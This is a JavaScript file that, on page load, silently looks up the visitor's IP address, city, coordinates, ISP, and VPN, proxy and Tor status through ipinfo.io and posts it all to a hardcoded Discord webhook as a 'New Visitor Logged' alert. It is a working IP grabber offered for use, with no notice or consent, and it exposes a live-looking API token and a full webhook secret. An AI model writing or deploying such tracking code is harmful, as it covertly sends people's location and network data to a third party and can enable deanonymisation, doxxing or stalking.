const IPINFO_TOKEN = "7223e65562f40f";  // Replace with a new token when it expires

// Function to fetch IP details
async function fetchIPDetails() {
    try {
        const response = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
        const data = await response.json();

        // If API returns an error (e.g., missing/expired token)
        if (data.error) {
            console.error("Error fetching IP details:", data.error.message);
            return setDefaultData();
        }

        return data;
    } catch (error) {
        console.error("Failed to fetch IP details:", error);
        return setDefaultData();
    }
}

// Function to return default "NA" data if API fails
function setDefaultData() {
    return {
        ip: "NA",
        hostname: "NA",
        city: "NA",
        region: "NA",
        country: "NA",
        loc: "NA",
        org: "NA",
        postal: "NA",
        timezone: "NA",
        asn: { name: "NA", domain: "NA" },
        company: { name: "NA" },
        privacy: { vpn: false, proxy: false, tor: false, hosting: false },
        abuse: { contact: "NA", email: "NA" },
        domains: { total: "NA", domains: [] }
    };
}

// Function to send data to Discord webhook
async function sendToDiscord(ipData) {
    const webhookURL = "https://discord.com/api/webhooks/1334046008681693204/5YbMMb4m4OjVC6iiQSSbP0t7N1VSGSvmP4Lbtjc-KM44-gmWl_0VcUzVkolVxWAZTOuP";  // Replace with your Discord webhook

    const embed = {
        title: "🔍 New Visitor Logged",
        color: 16711680, // Red
        fields: [
            { name: "📌 IP", value: ipData.ip || "NA", inline: true },
            { name: "🏠 Hostname", value: ipData.hostname || "NA", inline: true },
            { name: "📍 Location", value: `${ipData.city || "NA"}, ${ipData.region || "NA"}, ${ipData.country || "NA"}`, inline: false },
            { name: "🌎 Coordinates", value: ipData.loc || "NA", inline: true },
            { name: "⏰ Timezone", value: ipData.timezone || "NA", inline: true },
            { name: "🏢 ASN", value: `${ipData.asn?.name || "NA"} (${ipData.asn?.domain || "NA"})`, inline: false },
            { name: "🏬 Company", value: ipData.company?.name || "NA", inline: false },
            { name: "🔐 VPN", value: ipData.privacy?.vpn ? "Yes" : "No", inline: true },
            { name: "🌍 Proxy", value: ipData.privacy?.proxy ? "Yes" : "No", inline: true },
            { name: "🕵️ Tor", value: ipData.privacy?.tor ? "Yes" : "No", inline: true },
            { name: "📡 Hosting", value: ipData.privacy?.hosting ? "Yes" : "No", inline: true },
            { name: "🚨 Abuse Contact", value: `${ipData.abuse?.contact || "NA"} (${ipData.abuse?.email || "NA"})`, inline: false },
            { name: "🔗 Domains", value: ipData.domains?.domains?.join(", ") || "NA", inline: false }
        ]
    };

    try {
        await fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ embeds: [embed] })
        });
        console.log("✅ IP info sent to Discord successfully!");
    } catch (error) {
        console.error("❌ Failed to send data to Discord:", error);
    }
}

// Main function
(async function () {
    const ipData = await fetchIPDetails();
    sendToDiscord(ipData);
})();
